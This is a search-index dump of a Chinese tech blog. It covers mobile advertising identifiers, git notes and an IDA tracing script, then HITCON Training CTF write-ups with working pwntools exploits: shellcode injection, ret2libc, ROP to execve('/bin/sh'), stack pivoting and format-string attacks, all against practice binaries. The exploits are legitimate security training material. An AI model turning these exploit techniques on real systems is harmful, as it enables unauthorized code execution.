","date":"2021-04-13","objectID":"/stack_unwind/:3:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"Android AdID Android AdID (简称 AAID) 是 Android 平台专为广告跟踪提供的唯一标识。但是 AAID 依赖 Google 服务框架，但国内手机基本上都没有内置 Google 服务框架，这种情况下，就无法获取 AAID。因此，这里就不做讨论了。 ","date":"2021-04-13","objectID":"/stack_unwind/:4:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"OAID 上面在介绍 IMEI/MEID 时谈到过，在 Android 10 以后，IMEI/MEID、IMSI 这些设备标识都被限制读取了。没有了 IMEI/MEID、IMSI 这些设备唯一标识，对于国内广告行业来说，简直是灭顶之灾。不过正所谓道高一尺魔高一丈，为了拯救国内移动广告市场，移动安全联盟(MSA) 推出了一套“移动智能终端补充设备标识体系”，并根据这套体系的技术要求，联盟开发并发布了一套支持多厂商的统一的补充设备标识调用 SDK。 这套体系中包含了四种标识符：UDID（设备唯一标识符）, OAID（匿名设备标识符）, VAID（开发者匿名设备标识符）, AAID（应用匿名设备标识符）。 这四种标识符中，UDID 相当于 IMEI/MEID，它具有无法重置，始终不变的特性。但是它不是提供给广告业务使用的，并且在统一 SDK v1.0.10 版本之后，这个标识符的获取接口被移除了。 OAID（匿名设备标识符）是用于广告业务的标识符，它在系统首次启动后立即生成，它虽然允许用户手动重置，在刷机、恢复出厂设置等特殊情况下也会重置，但是对于同一台设备上的不同 App，只要没有被重置的情况下，获取到的值都是一致的。因此，虽然它的跟踪特性跟 IMEI/MEID 相比稍微差了点，但是比 Android ID 还是要好一些的。 关于如何获取 OAID，在 移动安全联盟(MSA) 官网的文档里有详细说明，广告 SDK 演示实例中也给出了具体的代码实例。 另外多说一句，如果想要在 Flutter 开发的 Android 应用中获取 OAID 的话，可以使用 flutter_msa_sdk 这个插件，这个插件只是对移动安全联盟(MSA) 的统一 SDK 做了一下封装，不过用起来要比 Android 原版容易的多。 ","date":"2021-04-13","objectID":"/stack_unwind/:5:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"IDFA/IDFV iOS 设备虽然也有 IMEI、IMSI，但是苹果说要保护用户隐私，于是在 iOS 5.0 之后，就把这些接口取消了，不再允许开发者来获取它们了。 可是隐私归隐私，广告还是要做的嘛，于是苹果在 iOS 6.0 之后，推出了 IDFA 这样一个专门用于广告的标识符。同时还提供了一个 IDFV，它是同一个组织下的唯一标识符。 IDFA 允许用户在设置中进行重置，刷机或重置设备时，该标识符也会重置，但是在不同的 App 之间它是同一个值。它相当于上面谈到的 OAID 或 Android AdID。 IDFV 是给 Vendor 标识用户用的，对于隶属于同一个组织的 App，在同一台设备上获取到的 IDFV 都是同一个值。假设有两个应用，它们的 BundleID 分别是 com.adtalos.demo1 和 com.adtalos.demo2，那么它们的就是同一个 Vendor，这两个应用在同一台设备中获取到的 IDFV 就是相同的。它相当于 Android ID，只是表示组织的方式不同而已。 IDFA 和 IDFV 的获取方式非常简单： NSString *idfa = [[[ASIdentifierManager sharedManager] advertisingIdentifier] UUIDString]; NSString *idfv = [[[UIDevice currentDevice] identifierForVendor] UUIDString]; IDFA 和 IDFV 都可能获取不到值，获取不到时，返回值为 nil。 ","date":"2021-04-13","objectID":"/stack_unwind/:6:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"Mac 除了以上这些 ID 标识符以外，Mac 地址通常也会用于广告追踪。 但是很不幸，从 iOS 7.0 之后，苹果就禁止开发者获取 Mac 地址了。 对于 Android 来说，情况稍微好一点，虽然从 Android 6.0 开始，通过 WifiInfo 获取到的 Mac 地址永远是 02:00:00:00:00:00 这样一个固定值。但是通过下面这个方法还是可以在大多数情况下获取到 Mac 地址的： static String getMac() { try { List\u003cNetworkInterface\u003e all = Collections.list(NetworkInterface.getNetworkInterfaces()); for (NetworkInterface nif : all) { if (!nif.getName().equalsIgnoreCase(\"wlan0\") \u0026\u0026 !nif.getName().equalsIgnoreCase(\"eth0\")) { continue; } byte[] macBytes = nif.getHardwareAddress(); if (macBytes == null) { return \"\"; } StringBuilder sb = new StringBuilder(); for (byte b : macBytes) { sb.append(String.format(\"%02X:\", b)); } if (sb.length() \u003e 0) { sb.deleteCharAt(sb.length() - 1); } return sb.toString(); } } catch (Exception e) { e.printStackTrace(); } return \"\"; } 原理是扫描各个网络接口，当网络接口是 wlan0 或者 eth0 时，返回它的 Mac 地址。 OAID: https://sspai.com/post/58305 获取OAID: https://github.com/haoguibao/OaidDemo ","date":"2021-04-13","objectID":"/stack_unwind/:7:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":" 提交 git commit 创建和切换分支 git branch bugFix // 创建 git checkout bugFix // 切换 合并分支-merge git checkout bugFix; git merge master // 将master分支合并到bugFix 合并分支rebase git checkout bugFix git commit git rebase master head分离，让head指向某个提交记录而不是分支名 git checkout C1 // C1是一次提交记录，一般用哈希值表示节点名称 git checkout master^ 强制修改分支位置 git branch -f master HEAD~3 // 将master强制指向HEAD的第3级父提交 撤销变更 git reset 通过把分支记录回退几个提交记录来实现撤销改动。git reset 向上移动分支，原来指向的提交记录就跟从来没有提交过一样。在reset后，原本分支所做的变更还在，但是处于未加入暂存区状态。 git reset HEAD~1 git revert git reset的方式只对本地分支有用，对远程分支无用。为了撤销更改并分享给其他人，需要用git revert git revert HEAD 使用revert撤销会引入一个新的提交，这个新提交的更改是用来撤销上一步提交的(但是reset是回溯) 整理提交记录 git cherry-pick \u003c提交号\u003e 用来将一些提交复制到当前所在的位置(HEAD)下面。 git cherry-pick C2 C4：将提交记录C2, C4放到当前master分支下 交互式rebase 交互式 rebase 指的是使用带参数 --interactive 的 rebase 命令, 简写为 -i git rebase -i C2 本地栈式提交 来看一个在开发中经常会遇到的情况：我正在解决某个特别棘手的 Bug，为了便于调试而在代码中添加了一些调试命令并向控制台打印了一些信息。 这些调试和打印语句都在它们各自的提交记录里。最后我终于找到了造成这个 Bug 的根本原因，解决掉以后觉得沾沾自喜！ 最后就差把 bugFix 分支里的工作合并回 master 分支了。你可以选择通过 fast-forward 快速合并到 master 分支上，但这样的话 master 分支就会包含我这些调试语句了。你肯定不想这样，应该还有更好的方式…… 只要让 Git 复制解决问题的那一个提交记录就可以了。跟之前我们在“整理提交记录”中学到的一样，我们可以使用 git rebase -i git cherry-pick 提交技巧 接下来这种情况也是很常见的：你之前在 newImage 分支上进行了一次提交，然后又基于它创建了 caption 分支，然后又提交了一次。 此时你想对的某个以前的提交记录进行一些小小的调整。比如设计师想修改一下 newImage 中图片的分辨率，尽管那个提交记录并不是最新的了。 先用 git rebase -i 将提交重新排序，然后把我们想要修改的提交记录挪到最前 然后用 commit --amend 来进行一些小修改 接着再用 git rebase -i 来将他们调回原来的顺序 最后我们把 master 移到修改的最前端（用你自己喜欢的方法），就大功告成啦！ 使用git cherry-pick来进行上面的提交，避免可能导致的冲突 cherry-pick 可以将提交树上任何地方的提交记录取过来追加到 HEAD 上（只要不是 HEAD 上游的提交就没问题）。 （这个好像要先用git checkout把master分支跟HEAD分离 git tag 可以（在某种程度上 —— 因为标签可以被删除后重新在另外一个位置创建同名的标签）永久地将某个特定的提交命名为里程碑，然后就可以像分支一样引用了。 更难得的是，它们并不会随着新的提交而移动。你也不能检出到某个标签上面进行修改提交，它就像是提交树上的一个锚点，标识了某个特定的位置。 git tag v1 C1将C1这个标签命名为C1，如果不指定提交记录，会直接用HEAD指向的位置 git describe Git Describe 能帮你在提交历史中移动了多次以后找到方向；当你用 git bisect（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令。 git describe \u003cref\u003e \u003cref\u003e 可以是任何能被 Git 识别成提交记录的引用，如果你没有指定的话，Git 会以你目前所检出的位置（HEAD）。 它输出的结果是这样的： \u003ctag\u003e_\u003cnumCommits\u003e_g\u003chash\u003e tag 表示的是离 ref 最近的标签， numCommits 是表示这个 ref 与 tag 相差有多少个提交记录， hash 表示的是你所给定的 ref 所表示的提交记录哈希值的前几位。 当 ref 提交记录上有某个标签时，则只输出标签名称 git rebase git rebase master branche1 选择父提交记录 操作符 ^ 与 ~ 符一样，后面也可以跟一个数字。 但是该操作符后面的数字与 ~ 后面的不同，并不是用来指定向上返回几代，而是指定合并提交记录的某个父提交。还记得前面提到过的一个合并提交有两个父提交吧，所以遇到这样的节点时该选择哪条路径就不是很清晰了。 Git 默认选择合并提交的“第一个”父提交，在操作符 ^ 后跟一个数字可以改变这一默认行为。 git branch bugWork master~^2~ 纠缠不清的分支 在我们的 master 分支是比 one、two 和 three 要多几个提交。出于某种原因，我们需要把 master 分支上最近的几次提交做不同的调整后，分别添加到各个的分支上。 one 需要重新排序并删除 C5，two 仅需要重排排序，而 three 只需要提交一次。 $ git checkout one $ git cherry-pick C4 C3 C2 $ git checkout two $ git cherry-pick C5 C4 C3 C2 $ git branch -f three C2 远程: git clone git clone后，本地会多一个叫做o/master的分支，叫做远程分支 远程分支命名规范: /， 所以上一步的o实际上是指origin` git checkout o/master; git commit以后o/master并不会改变。 git fetch 从远程仓库获取数据 git fetch 完成了仅有的但是很重要的两步: 从远程仓库下载本地仓库中缺失的提交记录 更新远程分支指针(如 o/master) git fetch 实际上将本地仓库中的远程分支更新成了远程仓库相应分支最新的状态。 远程分支反映了远程仓库在你最后一次与它通信时的状态，git fetch 就是你与远程仓库通信的方式了！ git fetch 并不会改变你本地仓库的状态。它不会更新你的 master 分支，也不会修改你磁盘上的文件。 理解这一点很重要，因为许多开发人员误以为执行了 git fetch 以后，他们本地仓库就与远程仓库同步了。它可能已经将进行这一操作所需的所有数据都下载了下来，但是并没有修改你本地的文件。 所以, 你可以将 git fetch 的理解为单纯的下载操作。 git pull git fetch; git merge o/master相当于git pull git pull 就是 git fetch 和 git merge \u003cjust-fetched-branch\u003e 的缩写 git push 假设你周一克隆了一个仓库，然后开始研发某个新功能。到周五时，你新功能开发测试完毕，可以发布了。但是 —— 天啊！你的同事这周写了一堆代码，还改了许多你的功能中使用的 API，这些变动会导致你新开发的功能变得不可用。但是他们已经将那些提交推送到远程仓库了，因此你的工作就变成了基于项目旧版的代码，与远程仓库最新的代码不匹配了。 这种情况下, git push 就不知道该如何操作了。如果你执行 git push，Git 应该让远程仓库回到星期一那天的状态吗？还是直接在新代码的基础上添加你的代码，异或由于你的提交已经过时而直接忽略你的提交？ 因为这情况（历史偏离）有许多的不确定性，Git 是不会允许你 push 变更的。实际上它会强制你先合并远程最新的代码，然后才能分享你的工作。 使用rebase调整本地工作状态 git fetch; git rebase o/master; git push 我们用 git fetch 更新了本地仓库中的远程分支，然后用 rebase 将我们的工作移动到最新的提交记录下，最后再用 git push 推送到远程仓库。 也可以使用merge在远程仓库变更了以后更新本地工作状态 git fetch; git merge o/master; git push 我们用 git fetch 更新了本地仓库中的远程分支，然后合并了新变更到我们的本地分支（为了包含远程仓库的变更），最后我们用 git push 把工作推送到远程仓库 git pull --rebase git fetch \u0026\u0026 git rebase的缩写 git pull --rebase; git push 远程跟踪分支 Git 好像知道 master 与 ","date":"2021-04-13","objectID":"/git%E5%91%BD%E4%BB%A4/:0:0","tags":null,"title":"git使用","uri":"/git%E5%91%BD%E4%BB%A4/"},{"categories":["notes"],"content":" #coding=utf-8 import idaapi import idc import re import ida_dbg import ida_idd from idaapi import * from collections import OrderedDict import logging import time import datetime import os debughook = None def xx_hex(ea): return hex(ea).rstrip(\"L\").lstrip(\"0x\") def set_breakpoint(ea, isthumb=1): # idc.SetReg(ea, \"T\", 1) idc.MakeCode(ea) idc.add_bpt(ea) def my_get_reg_value(register): rv = ida_idd.regval_t() ida_dbg.get_reg_val(register, rv) current_addr = rv.ival return current_addr def suspend_other_thread(): current_thread = idc.get_current_thread() thread_count = idc.get_thread_qty() for i in range(0, thread_count): other_thread = idc.getn_thread(i) if other_thread != current_thread: idc.suspend_thread(other_thread) def resume_process(): current_thread = idc.get_current_thread() thread_count = idc.get_thread_qty() for i in range(0, thread_count): other_thread = idc.getn_thread(i) if other_thread != current_thread: idc.resume_thread(other_thread) idc.resume_thread(current_thread) idc.resume_process() class MyDbgHook(DBG_Hooks): \"\"\" Own debug hook class that implementd the callback functions \"\"\" def __init__(self, modules_info, skip_functions, end_ea): super(MyDbgHook, self).__init__() self.modules_info = modules_info self.skip_functions = skip_functions self.trace_step_into_count = 0 self.trace_step_into_size = 1 self.trace_total_size = 300000 self.trace_size = 0 self.trace_lr = 0 self.end_ea = end_ea self.bpt_trace = 0 self.Logger = None self.line_trace = 0 print(\"__init__\") def start_line_trace(self): self.bpt_trace = 0 self.line_trace = 1 self.start_hook() print(\"start_line_trace\") def start_hook(self): self.hook() print(\"start_hook\") def dbg_process_start(self, pid, tid, ea, name, base, size): print(\"Process started, pid=%dtid=%dname=%s\" % (pid, tid, name)) def dbg_process_exit(self, pid, tid, ea, code): self.unhook() if self.Logger: self.Logger.log_close() print(\"Process exited pid=%dtid=%dea=0x%xcode=%d\" % (pid, tid, ea, code)) def dbg_process_detach(self, pid, tid, ea): self.unhook() self.Logger.log_close() return 0 def dbg_bpt(self, tid, ea): print(\"Break point at 0x%xtid=%d\" % (ea, tid)) if ea in self.end_ea: ida_dbg.enable_insn_trace(False) ida_dbg.enable_step_trace(False) ida_dbg.suspend_process() return 0 return 0 def dbg_trace(self, tid, ea): print(\"Trace tid=%dea=0x%x\" % (tid, ea)) # return values: # 1 - do not log this trace event; # 0 - log it if self.line_trace: in_mine_so = False for module_info in self.modules_info: print(module_info, ea) so_base = module_info[\"base\"] so_size = module_info[\"size\"] if so_base \u003c= ea \u003c= (so_base + so_size): in_mine_so = True break self.trace_size += 1 if (not in_mine_so) or (ea in self.skip_functions): print(self.trace_lr, self.trace_step_into_count, self.trace_step_into_size) if (self.trace_lr != 0) and (self.trace_step_into_count \u003c self.trace_step_into_size): self.trace_step_into_count += 1 return 0 if (self.trace_lr != 0) and (self.trace_step_into_count == self.trace_step_into_size): ida_dbg.enable_insn_trace(False) ida_dbg.enable_step_trace(False) ida_dbg.suspend_process() if self.trace_size \u003e self.trace_total_size: self.trace_size = 0 ida_dbg.request_clear_trace() ida_dbg.run_requests() ida_dbg.request_run_to(self.trace_lr \u0026 0xFFFFFFFE) ida_dbg.run_requests() self.trace_lr = 0 self.trace_step_into_count = 0 return 0 if self.trace_lr == 0: self.trace_lr = my_get_reg_value(\"LR\") return 0 def dbg_run_to(self, pid, tid=0, ea=0): print(\"dbg_run_to 0x%xpid=%d\" % (ea, pid)) if self.line_trace: ida_dbg.enable_insn_trace(True) ida_dbg.enable_step_trace(True) ida_dbg.request_continue_process() ida_dbg.run_requests() def unhook(): global debughook # Remove an existing debug hook try: if debughook: print(\"Removing previous hook ...\") debughook.unhook() debughook.Logger.log_close() except: pass def starthook(): global debughook if debughook: debughook.start_line_trace() def main(): global debughook unhook() skip_functions = [] modules_info = [] start_ea = 0 end_ea = [] so_modules = ","date":"2021-04-13","objectID":"/ida_trace/:0:0","tags":null,"title":"ida trace使用","uri":"/ida_trace/"},{"categories":["writeup"],"content":"lab1 略 ","date":"2021-02-19","objectID":"/hitcon-training/:1:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab2 反编译 unsigned int orw_seccomp() { __int16 v1; // [esp+4h] [ebp-84h] char *v2; // [esp+8h] [ebp-80h] char v3; // [esp+Ch] [ebp-7Ch] unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(\u0026v3, \u0026unk_8048640, 0x60u); v1 = 12; v2 = \u0026v3; prctl(38, 1, 0, 0, 0); prctl(22, 2, \u0026v1); return __readgsdword(0x14u) ^ v4; } int __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\"Give my your shellcode:\"); read(0, \u0026shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } 可以执行shellcode但是存在prctl函数的限制 ","date":"2021-02-19","objectID":"/hitcon-training/:2:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"prctl 函数 这个函数可以对进程就行操作，第一个参数可以指定你想做的事。 函数原型： #include \u003csys/prctl.h\u003e int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 第一个参数是指定相应的操作，这里我们需要重点关注两个： 1. PR_SET_NO_NEW_PRIVS 2. PR_SET_SECCOMP 继续看手册上的介绍，对于第一个参数选项，如果 option 设置为 PR_SET_NO_NEW_PRIVS 的话，第二个参数如果设置为 1 的话，不能够进行 execve 的系统调用，同时这个选项还会继承给子进程。 这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read。 这里也就是调用下面的语句进行设置： prctl(PR_SET_NO_NEW_PRIVS, 1LL...); 在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了题目中的第一个 prctl 语句。 因此在orw_seccomp方法限制之下，不能用system(/bin/sh)或者execve(/bin/sh)了 想要获取flag只能进行如下操作 fd = open(\"flag\") read(fd, buf, 0x30) write(1, buf, 0x30) 这段代码对应的汇编是这样的： \u003e push 1; \u003e dec byte ptr [esp]; 先将1入栈后在用dec指令减1，得到0作为指针数组的第二个元素 \u003e push 0x67616c66; 再将“flag”入栈作为指针数组的第一个元素 \u003e mov ebx,esp; ebx指向栈顶也就是指向 open函数的第一个参数（指针数组） \u003e xor ecx,ecx; xor清零ecx对应第二个参数 \u003e xor edx,edx; xor清零edx对应第三个参数 \u003e xor eax,eax; xor清零eax \u003e mov al,0x5; 向eax传入系统调用号0x05 \u003e int 0x80; 调用fp=open(\"flag\",0) \u003e mov ebx,eax; ebx被赋值为0x05，read(fp,buf,0x30) \u003e xor eax,eax; xor清空eax \u003e mov al,0x3; 传入read函数对应的系统调用号 \u003e mov ecx,esp; 将栈顶的地址传给ecx作为read的第二个参数，将flag文件中的内容入栈 \u003e mov dl,0x30; read的第三个参数，读0x30个字符 \u003e int 0x80; 调用read(fp,buf,0x30) \u003e mov al,0x4; write函数的系统调用号，write(1,buf,0x30) \u003e mov bl,1; ebx对应第一个参数 \u003e mov dl,0x30; edx对应第三个参数 \u003e int 0x80; 调用write(1,buf,0x30) 实际上seccomp(全称：secure computing mode)，将进程可用的系统调用限制为四种：read，write，_exit，sigreturn。最初的这种模式是白名单方式，在这种安全模式下，除了已打开的文件描述符和允许的四种系统调用，如果尝试其他系统调用，内核就会使用SIGKILL或SIGSYS终止该进程。 可以使用seccomp-tools来查看可以使用的系统调用。 # seccomp-tools dump ./orw.bin line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0x40000003 if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x07 0x00 0x000000ad if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077 if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003 if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004 if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026 return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 这里可以看到只有open, read, write这几种。 也可以直接使用shellcraft来编写汇编 https://pwntoolsdocinzh-cn.readthedocs.io/en/master/shellcraft.html from pwn import * context.log_level = \"debug\" p=process('./orw.bin') # push path payload=shellcraft.pushstr('./flag.txt') # open file payload+=shellcraft.open(\"esp\") # read file payload+=shellcraft.read(\"eax\",\"esp\",0x100) # write stdout payload+=shellcraft.write(1,\"esp\",0x100) p.recv(1024) #gdb.attach(p) p.sendline(asm(payload)) p.recvall() p.close() ","date":"2021-02-19","objectID":"/hitcon-training/:2:1","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab3 反编译: int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-14h] setvbuf(stdout, 0, 2, 0); printf(\"Name:\"); read(0, \u0026name, 0x32u); printf(\"Try your best:\"); return (int)gets(\u0026s); } 简单栈溢出, name(0x0804a060)所在段可执行,可写shellcode，利用gets处的溢出将main的返回地址改成name的地址。 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /home/LAB/lab3/ret2sc 0x8049000 0x804a000 r-xp 1000 0 /home/LAB/lab3/ret2sc 0x804a000 0x804b000 rwxp 1000 1000 /home/LAB/lab3/ret2sc #coding=utf-8 from pwn import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"split\", \"-h\"] r = process(\"./ret2sc\") r.recvuntil(\":\") shellcode = asm(shellcraft.sh()) r.sendline(shellcode) r.recvuntil(\":\") name_address = 0x0804a060 payload = \"a\"*32 + p32(name_address) r.sendline(payload) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:3:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab4 反编译: int __cdecl main(int argc, const char **argv, const char **envp) { char **v4; // [esp+4h] [ebp-11Ch] int v5; // [esp+8h] [ebp-118h] char src; // [esp+12h] [ebp-10Eh] char buf; // [esp+112h] [ebp-Eh] const void **v8; // [esp+11Ch] [ebp-4h] puts(\"###############################\"); puts(\"Do you know return to library ?\"); puts(\"###############################\"); puts(\"What do you want to see in memory?\"); printf(\"Give me an address (in dec) :\"); fflush(stdout); read(0, \u0026buf, 0xAu); v8 = (const void **)strtol(\u0026buf, v4, v5); See_something(v8); printf(\"Leave some message for me :\"); fflush(stdout); read(0, \u0026src, 0x100u); Print_message(\u0026src); puts(\"Thanks you ~\"); return 0; } See_something函数支持打印出v8地址处的值，可以泄露出libc的地址。然后利用Print_message的栈溢出将其返回地址修改成system函数的地址。 #coding=utf-8 from pwn import * context.terminal = [\"tmux\", \"split\", \"-h\"] context.log_level = \"debug\" DEBUG = 1 r = process(\"./ret2lib\") if DEBUG: gdb.attach(r, \"\"\" b *0x0804857c c \"\"\") r.recvuntil(\":\") puts_got = 0x0804a01c r.sendline(str(puts_got)) r.recvuntil(\"The content of the address :\") puts_str = r.recvuntil('\\n') success(\"recv address: \" + puts_str) puts = int(puts_str, 16) success(\"puts address: \" + hex(puts)) system = puts - 0x5fcb0 + 0x3adb0 sh = 0x804929e payload = \"a\"*0x3c + p32(system) + \"aaaa\" + p32(sh) r.recvuntil(\":\") r.sendline(payload) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:4:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab5 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [esp+1Ch] [ebp-14h] puts(\"ROP is easy is'nt it ?\"); printf(\"Your input :\"); fflush(stdout); return read(0, \u0026v4, 100); } 栈溢出，静态链接，没有system函数与/bin/sh只能自己构造。 ","date":"2021-02-19","objectID":"/hitcon-training/:5:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"int 0x80 通过系统调用实现的hello world代码： .section .data msg: .ascii \"Hello world!\\n\" .section .text .globl _start _start: movl $4, %eax movl $1, %ebx movl $msg, %ecx movl $13, %edx int $0x80 movl $1, %eax movl $0, %ebx int $0x80 系统调用是通过int 0x80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数 所以需要将/bin/sh写入bss段，然后利用系统调用执行 #coding=utf-8 from pwn import * r = process(\"./simplerop) gadget = 0x809a15d # mov dword ptr [edx], eax ; ret pop_eax_ret = 0x80bae06 pop_edx_ret = 0x806e82a pop_edx_ecx_ebx = 0x0806e850 pop_eax_ret = 0x080bae06 buf = 0x80ea060 int_80 = 0x80493e1 #write to memory payload = \"a\"*32 payload += p32(pop_edx_ret) payload += p32(buf) payload += p32(pop_eax_ret) payload += \"/bin\" payload += p32(gadget) payload += p32(pop_edx_ret) payload += p32(buf+4) payload += p32(pop_eax_ret) payload += \"/sh\\x00\" payload += p32(gadget) #write to register payload += p32(pop_edx_ecx_ebx) payload += p32(0) payload += p32(0) payload += p32(buf) payload += p32(pop_eax_ret) payload += p32(0xb) payload += p32(int_80) print len(payload) r.recvuntil(\":\") r.sendline(payload) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:5:1","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab6 int __cdecl main(int argc, const char **argv, const char **envp) { char buf; // [esp+0h] [ebp-28h] if ( count != 1337 ) exit(1); ++count; setvbuf(_bss_start, 0, 2, 0); puts(\"Try your best :\"); return read(0, \u0026buf, 0x40u); } 栈不可执行。并且可以溢出的大小只有20个字节，而且限制了main函数只能执行一次，所以需要用到栈迁移。 以32位为例，在使用call这个命令，进入一个函数的时候,程序会进行一系列栈操作: push eip+4;push ebp;mov ebp,esp;来保护现场，避免执行完函数后堆栈不平衡以及找不到之前的入口地址。 leave ret相当于 leave ==\u003e mov esp, ebp; pop ebp; ret ==\u003e pop eip 其中pop eip相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次leave ret即可控制esp为我们想要的地址。由于有pop ebp，会使esp-4，将ebp 覆盖为想要调整的位置-4即可。 查看程序的空间分布 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /home/LAB/lab6/migration 0x8049000 0x804a000 r–p 1000 0 /home/LAB/lab6/migration 0x804a000 0x804b000 rw-p 1000 1000 /home/LAB/lab6/migration 0xf7d77000 0xf7d78000 rw-p 1000 0 0xf7d78000 0xf7f28000 r-xp 1b0000 0 /lib/i386-linux-gnu/libc-2.23.so 可以看到0x804a000后有0x1000的可读写空间，可以将栈迁移到这个地方。 首先第一次需要改变ebp的值，然后转到read函数处，读入内容的地址为栈迁移的地址。将read以后的返回地址写成leave gadget以此达到栈迁移的目的。 bss_addr = 0x804a000 payload = flat(['a'*0x28, bss_addr+0x300, read_addr, leave_gadget, 0, bss_addr+0x300, 0x30]) 第二次需要泄露libc的地址，使用puts打印出read/puts函数got表中的地址。 payload = flat([bss_addr+0x600, puts_addr, pop_ret, puts_got, read_addr, leave_gadget, 0, bss_addr+600, 0x30]) 第三次需要返回到system函数处 payload = flat([bss_addr+0x300, system_addr, pop_ret, bin_addr]) exp: from pwn import * context.log_level = \"debug\" context.terminal = ['tmux', 'splitw', '-h'] r = process(\"./migration\") elf = ELF(\"./migration\") libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") bss_addr = 0x804a000 leave_ret = 0x08048418 pop_ebx_ret = 0x0804836d read_plt = elf.plt[\"read\"] puts_plt = elf.plt[\"puts\"] puts_got = elf.got[\"puts\"] DEBUG = 1 if DEBUG: gdb.attach(r, \"\"\" b *0x08048418 \"\"\") payload = \"a\" * 0x28 payload += p32(bss_addr + 0x300) # fake ebp payload += p32(read_plt) # read(0,buf,0x30) payload += p32(leave_ret) # ret to buf payload += p32(0) # fd payload += p32(bss_addr + 0x300) # buf payload += p32(0x30) # bytes r.recvuntil(\":\\n\") r.send(payload) sleep(0.2) payload = p32(bss_addr + 0x600) # fake ebp payload += p32(puts_plt) # puts(puts_got) payload += p32(pop_ebx_ret) payload += p32(puts_got) payload += p32(read_plt) # read(0,buf + 0x100,0x30) payload += p32(leave_ret) # ret to buf + 0x100 payload += p32(0) # fd payload += p32(bss_addr + 0x600) # buf payload += p32(0x30) # bytes r.sendline(payload) sleep(0.2) libc_base = u32(r.recv(4)) - libc.sym[\"puts\"] success(\"libc_base : \" + hex(libc_base)) system_addr = libc_base + libc.sym[\"system\"] bin_sh_addr = libc_base + libc.search(\"/bin/sh\").next() payload = p32(0) payload += p32(system_addr) # system(\"/bin/sh\") payload += p32(0) payload += p32(bin_sh_addr) r.sendline(payload) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:6:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab7 格式化字符串，直接泄露password的值 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"split\", \"-h\"] r = process(\"./crack\") #gdb.attach(r, \"\"\" # b *0x080486E9 #\"\"\") password_addr = 0x804a048 r.recvuntil(\"?\") r.sendline(p32(password_addr) + \"#\" + \"%10$s\" + \"#\" ) r.recvuntil(\"#\") p = r.recvuntil(\"#\") password = u32(p[:4]) success(\"password: \" + str(password)) r.recvuntil(\":\") r.sendline(str(password)) r.interactive() 或者直接更改password的值 from pwn import * context.log_level = 'debug' cn = process('./crack') p_pwd = 0x0804A048 fmt_len = 10 cn.recv() pay = fmtstr_payload(fmt_len,{p_pwd:1}) cn.sendline(pay) cn.recv() cn.sendline('1') cn.recv() cn.recv() fmtstr_payload函数可以直接生成payload。简单使用如下: Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime. Parameters: offset (int) – the first formatter’s offset you control writes (dict) – dict with addr, value {addr: value, addr2: value2} numbwritten (int) – number of byte already written by the printf function write_size (str) – must be byte, short or int. Tells if you 